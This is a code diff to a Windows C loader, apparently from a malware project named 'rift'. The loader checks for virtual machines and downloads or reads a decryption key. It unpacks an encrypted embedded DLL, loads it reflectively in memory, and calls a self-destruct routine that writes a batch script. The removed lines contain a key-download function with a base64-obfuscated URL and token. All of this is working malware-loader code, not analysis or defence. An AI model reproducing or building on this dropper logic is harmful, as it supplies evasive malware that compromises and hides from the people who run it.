@@ -14,31 +14,17 @@ INT WINAPI wWinMain(
 ) {
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(nCmdShow);
-	{	// Initialize Process Information block
-		HANDLE hPH = GetProcessHeap();
-		g_PIB = (PPIB)HeapAlloc(hPH, 0, sizeof(PIB));
-		g_PIB->hPH = hPH;
+	{	// Process Information Block
 		g_PIB->hMH = hInstance;
 		GetModuleFileNameW(hInstance, g_PIB->szMFN, MAX_PATH);
 		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
+		EXoshiroBegin();
 	}
 
-
-//	fnErasePeHeader();
-
-	MessageBox(0, L"TEST : 1", 0, 0);
-
-	// Halt Execution (Debugging safety)
-	for (;;);
-
-#ifndef _DEBUG
-	// Protect Process
-	BOOL bRE = fnAntiRE();
-#endif
-	EXoshiroBegin();
+	CreateMutexW(0, FALSE, L"Local\\");
 
 	// init con
-	// IOpenConsole();
+	IOpenConsole();
 	BOOL bVM = ICheckVmPresent();
 
 	PVOID pWKey = IDownloadKey();
@@ -47,25 +33,21 @@ INT WINAPI wWinMain(
 		PathCchCombine(szKeyBlob, MAX_PATH, g_PIB->szCD, L"RIFTWKEY"); // Temporery
 		DWORD nKeyBlob;
 		pWKey = AllocReadFileW(szKeyBlob, &nKeyBlob);
-	}
-	EAesCryptBegin();
-	IAesLoadWKey(pWKey);
+	} if (pWKey)
+		ECryptBegin(pWKey, &g_PIB->cibWK);
+	else
+		return 0x45e0;
 
-	EDecompressBegin();
-	EMd5HashBegin();
 	SIZE_T nDll;
-	PVOID pDll = EUnpackResource(IDR_RIFTDLL, &nDll);
-	EMd5HashEnd();
-	EDecompressEnd();
-	EAesCryptEnd();
+	PVOID pDll = EUnpackResource(&g_PIB->cibWK, IDR_RIFTDLL, &nDll);
 	if (!pDll)
-		return 0x1;
+		return 0x132d;
 
 #ifndef _DEBUG
 	// "Reflective" DLL loading will only be used in the release build
 	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
 	if (!hDll)
-		return 0x2;
+		return 0x276f;
 
 	pEDllInit EDllInit = (pEDllInit)MemoryGetProcAddress(hDll, "EDllInit");
 	int a = EDllInit(10);
@@ -74,7 +56,7 @@ INT WINAPI wWinMain(
 #else
 	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
 	if (!dhDll)
-		return 0x2;
+		return 0x2ab5;
 
 	pEDllInit EDllInit = (pEDllInit)GetProcAddress(dhDll, "EDllInit");
 	BOOL bTest = EDllInit(g_PIB);
@@ -95,41 +77,6 @@ INT WINAPI wWinMain(
 		HeapFree(hPH, 0, g_PIB);
 	} return 0;
 }
-
-// Only Test rn but might be implemented further
-PVOID IDownloadKey() {
-	PCWSTR szAgent = EAllocRandomBase64StringW(8, 16);
-	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
-	if (!hNet)
-		return 0;
-	FreeMemory(szAgent);
-
-	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
-	SIZE_T nURL;
-	PCSTR szURL = EBase64Decode(szB64URL, 156, &nURL);
-	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, 0, 0, 0, 0);
-	if (!hUrl)
-		return 0;
-	FreeMemory(szURL);
-
-	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);
-
-	SIZE_T nRead;
-	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);
-
-	InternetCloseHandle(hUrl);
-	InternetCloseHandle(hNet);
-
-	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b))
-		goto EXIT;
-
-	return pBuffer;
-EXIT:
-	FreeMemory(pBuffer);
-	return 0;
-}
-
-
 
 /*	This function basically does what it's called,
 	it "cleans" (or better purges) everything it can and tries to destroy
@@ -156,7 +103,7 @@ VOID ESelfDestruct() {
 
 	// Prepare Script content
 	PVOID pScriptW = AllocMemory(0x800);
-	UINT uiRandomID = EXoshiroSS();
+	UINT uiRandomID = EXoshiroSS(0);
 	PCWSTR szMFN = GetFileNameFromPathW(g_PIB->szMFN);
 	StringCchPrintfW(pScriptW, 0x400, l_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, GetFileNameFromPathW(szFilePath));
 
